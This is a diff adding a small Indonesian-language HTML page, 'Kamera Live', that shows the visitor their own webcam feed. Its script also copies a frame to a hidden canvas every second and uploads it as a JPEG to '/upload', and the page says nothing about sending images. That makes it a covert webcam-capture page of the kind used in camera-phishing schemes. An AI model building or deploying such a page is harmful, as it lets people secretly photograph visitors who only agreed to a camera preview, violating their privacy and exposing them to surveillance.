@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Akses Kamera</title>
+</head>
+<body>
+  <h1>Kamera Live</h1><video id="video" autoplay playsinline style="max-width: 100%; height: auto;"></video>
+<canvas id="canvas" style="display: none;"></canvas>
+
+<script>
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const context = canvas.getContext('2d');
+
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function(stream) {
+      video.srcObject = stream;
+
+      video.onloadedmetadata = () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        setInterval(() => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('image', blob, 'frame.jpg');
+
+            fetch('/upload', {
+              method: 'POST',
+              body: formData
+            });
+          }, 'image/jpeg');
+        }, 1000);
+      };
+    })
+    .catch(err => {
+      console.error("Tidak bisa akses kamera:", err);
+    });
+</script>
+  
+</body>
+</html>
